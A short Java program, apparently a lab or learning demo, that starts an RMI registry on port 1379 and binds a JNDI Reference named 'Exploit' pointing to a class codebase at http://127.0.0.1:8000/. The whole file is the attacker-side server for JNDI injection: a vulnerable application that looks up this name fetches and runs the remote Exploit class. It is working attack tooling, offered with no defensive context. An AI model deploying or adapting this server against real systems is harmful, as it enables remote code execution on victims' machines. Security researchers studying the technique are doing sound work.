import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author yuhao5
 * @date 2020-08-14
 */
public class RMIServer {
    public static void main(String[] args) throws RemoteException, MalformedURLException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1379);
        //这里请求的localhost 8000端口的Exploit对象
        Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("rmi://127.0.0.1:1379/Exploit",referenceWrapper);
//        Naming.bind("rmi://127.0.0.1:1379/Exploit",referenceWrapper);
    }
}
